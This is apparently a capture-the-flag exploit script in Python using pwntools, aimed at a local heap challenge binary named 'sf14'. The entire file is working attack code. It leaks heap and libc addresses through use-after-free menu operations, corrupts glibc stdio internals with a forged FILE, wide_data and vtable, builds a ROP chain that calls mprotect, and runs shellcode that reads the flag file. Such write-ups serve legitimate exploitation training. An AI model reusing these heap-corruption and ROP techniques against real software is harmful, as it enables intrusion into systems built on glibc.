from pwn import *

p = process('./sf14')
context(arch='amd64', os='linux')



# gadget
pop_rdi_ret = 0x0000000000021102
pop_rsi_ret = 0x00000000000202e8
pop_rdx_ret = 0x0000000000001b92
#syscall = 0x00000000000026bf
syscall = 1054576
pop_rax_ret = 0x0000000000033544
ret = 0x0000000000000937
def choice(idx):
   p.sendlineafter(">>",str(idx))

def add(name):
   choice(1)
   p.recvuntil("name :")
   p.send(name)

def make_color(name,_id,_list):
   choice(2)
   p.recvuntil("name :")
   p.send(name)
   p.recvuntil("id :")
   p.sendline(_id)
   if len(_list) > 0:
      for i in _list:
         p.recvuntil("]")
         p.sendline('y')
         p.sendlineafter(">>",str(i))
      if len(_list) < 7:
         p.recvuntil("]")
         p.sendline('n')
   else:
      p.recvuntil("]")
      p.sendline('n')

def delete(_id):
   choice(3)
   p.recvuntil("id :")
   p.sendline(_id)

delete('1')
delete('2')
add('a'*0x10)

# heap leak
choice(2)
p.recvuntil("name :");p.send('\x00')
p.recvuntil("id :");p.sendline(str(0x120))
p.sendlineafter("]",'y');p.recvuntil("a"*0x10)
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x10
log.info("heap_base = {}".format(hex(heap_base)))
p.sendlineafter(">>","0")
p.sendlineafter("]", 'n')

#libc leak
delete(str(0x120))
delete('0')
make_color('a',str(0x130),[])
delete(str(0x130))
choice(2)
p.recvuntil("name :");p.send('\x00')
p.recvuntil("id :");p.sendline(str(0x140))
p.sendlineafter("]",'y')
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 3951496
log.info("libc_base = {}".format(hex(libc_base)))
main_arena88 = libc_base + 3951496
io_buf_end = libc_base + 3950880
p.sendlineafter(">>","0")
p.sendlineafter("]", 'n')
delete(str(main_arena88))
make_color(p64(heap_base + 0x40)[:-1],str(heap_base + 0x1a0),[])
make_color(p64(heap_base + 0x110)[:-1],str(0x300),[])
add(p64(main_arena88)+p64(heap_base + 0x110))
add('a')
delete(str(heap_base+0x1a0))
add('a'*8+p64(io_buf_end - 0x10))
log.info("io_buf_end = {}".format(hex(io_buf_end)))
make_color('a',str(0x303),[])
setcontext = libc_base + 293696
wide_data = libc_base + 3951040
log.info("wide_data = {}".format(hex(wide_data)))

shellcode = ''
shellcode += asm(shellcraft.pushstr("/home/sf14/flag"))
shellcode += asm(shellcraft.open('rsp', 0, 0))
shellcode += asm(shellcraft.read('rax', 'rsp', 100))
shellcode += asm(shellcraft.write(1, 'rsp', 100))
'''
shellcode = ''
shellcode += asm('add rsp, 0x500')
shellcode += asm(shellcraft.pushstr('/home/sf14/flag'))
shellcode += asm(

	mov rdi, rsp
	xor rsi, rsi
	mov rax, 0x2
	syscall
	
	mov rdi, rax
	mov rsi, rsp	
	mov rdx, 100
	mov rax, 0
	syscall

	mov rdx, rax
	mov rsi, rsp
	mov rdi, 1
	mov rax, 1
	syscall
	l:
		jmp l
)
'''
payload = ''
payload += '\x00'*5 # dummy
payload += p64(libc_base + 3958672)
payload += '\xff'*8
payload += p64(0)
payload += p64(wide_data)# 0xa0
payload += p64(libc_base + ret)
payload += p64(0)*2
payload += '\xff'*4+'\x00'*4
payload += p64(0)*2
payload += p64(wide_data+208+0x10) # vtable
widedata = ''
widedata += p64(libc_base + pop_rdi_ret)
widedata += p64(libc_base)

widedata += p64(libc_base + pop_rsi_ret)
widedata += p64(0x9000000)

widedata += p64(libc_base + pop_rdx_ret)
widedata += p64(7) # chmod 7

widedata += p64(libc_base+pop_rax_ret)
widedata += p64(10)
widedata += p64(libc_base + syscall)
widedata += p64(libc_base+3951120)
widedata += (shellcode)
widedata += '\x90'*(0xe0-len(widedata))
vtable = ''
vtable += p64(setcontext+53)*20
payloads = payload+widedata+vtable
res = shellcode.find('1')
print res

raw_input()
p.sendlineafter(">>",payload+widedata+vtable)

p.interactive()
